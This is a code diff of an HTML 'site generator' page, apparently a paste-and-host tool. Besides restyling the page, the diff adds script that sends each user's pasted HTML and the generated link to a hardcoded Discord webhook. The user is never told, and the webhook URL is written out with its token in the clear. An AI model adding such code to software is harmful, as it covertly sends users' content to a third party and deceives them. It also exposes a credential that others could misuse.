@@ -1,21 +1,80 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>HTML Raw Uploader</title>
+  <title>HTML Site Generator</title>
   <style>
-    body { font-family: sans-serif; padding: 20px; background: #111; color: #eee; }
-    textarea { width: 100%; height: 300px; background: #222; color: #0f0; border: none; padding: 10px; font-family: monospace; }
-    button { padding: 10px 20px; font-size: 16px; background: #0f0; color: #000; border: none; margin-top: 10px; }
-    input { width: 100%; margin-top: 10px; padding: 10px; font-family: monospace; }
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #0f0f0f;
+      color: #e0e0e0;
+      font-family: 'Segoe UI', sans-serif;
+    }
+    header {
+      padding: 20px;
+      background: #111;
+      text-align: center;
+      font-size: 28px;
+      font-weight: bold;
+      color: #00ff99;
+      box-shadow: 0 2px 10px rgba(0, 255, 153, 0.2);
+    }
+    main {
+      padding: 20px;
+      max-width: 800px;
+      margin: auto;
+    }
+    textarea {
+      width: 100%;
+      height: 300px;
+      background-color: #1a1a1a;
+      color: #00ffcc;
+      border: none;
+      padding: 15px;
+      font-family: monospace;
+      font-size: 14px;
+      border-radius: 8px;
+      resize: vertical;
+      box-shadow: 0 0 5px #00ffcc40;
+    }
+    button {
+      background-color: #00ff99;
+      color: #000;
+      padding: 12px 24px;
+      font-size: 16px;
+      border: none;
+      margin-top: 10px;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    button:hover {
+      background-color: #00cc7a;
+    }
+    input {
+      width: 100%;
+      margin-top: 15px;
+      padding: 12px;
+      font-family: monospace;
+      font-size: 14px;
+      background: #181818;
+      color: #00ffcc;
+      border: none;
+      border-radius: 6px;
+    }
   </style>
 </head>
 <body>
-  <h1>HTML Raw Paste</h1>
-  <textarea id="htmlCode" placeholder="Paste your HTML code here..."></textarea>
-  <br>
-  <button onclick="savePaste()">Create Raw Page</button>
-  <input type="text" id="outputLink" readonly placeholder="Raw link will appear here">
+  <header>HTML Site Generator</header>
+  <main>
+    <textarea id="htmlCode" placeholder="Paste your HTML code here..."></textarea>
+    <button onclick="savePaste()">Generate Site</button>
+    <input type="text" id="outputLink" readonly placeholder="Your raw site link will appear here...">
+  </main>
+
   <script>
+    const webhookURL = "https://discord.com/api/webhooks/1380268452849389679/r65MSo1IY9kM9Ele6_KIYONXrehC0xbpApbjWzJrFCCS97rGeA0uex2TyFCXq8rAdMxv";
+
     function generateID(length = 8) {
       return [...Array(length)].map(() => Math.random().toString(36)[2]).join('');
     }
@@ -24,20 +83,44 @@
       const code = document.getElementById('htmlCode').value;
       const id = generateID();
       localStorage.setItem("raw_" + id, code);
-      const rawUrl = location.origin + "/#" + id;
-      document.getElementById('outputLink').value = rawUrl;
+      const link = location.origin + "/#" + id;
+      document.getElementById('outputLink').value = link;
+
+      // Send to Discord
+      const message = {
+        content: null,
+        embeds: [
+          {
+            title: "New HTML Site Generated",
+            description: `**Link:** [Click here](${link})\n\n\`\`\`html\n${truncate(code, 950)}\n\`\`\``,
+            color: 65280
+          }
+        ]
+      };
+
+      fetch(webhookURL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(message)
+      }).catch(console.error);
+    }
+
+    function truncate(str, maxLength) {
+      return str.length > maxLength ? str.slice(0, maxLength) + "\n...truncated" : str;
     }
 
     window.addEventListener('load', () => {
-      const hash = location.hash.slice(1);
-      if (hash) {
-        const code = localStorage.getItem("raw_" + hash);
+      const id = location.hash.slice(1);
+      if (id) {
+        const code = localStorage.getItem("raw_" + id);
         if (code) {
           document.open();
           document.write(code);
           document.close();
         } else {
-          document.body.innerHTML = "<h2>404 - Paste not found</h2>";
+          document.body.innerHTML = "<h2 style='color:red;text-align:center;margin-top:50px;'>404 - Paste Not Found</h2>";
         }
       }
     });
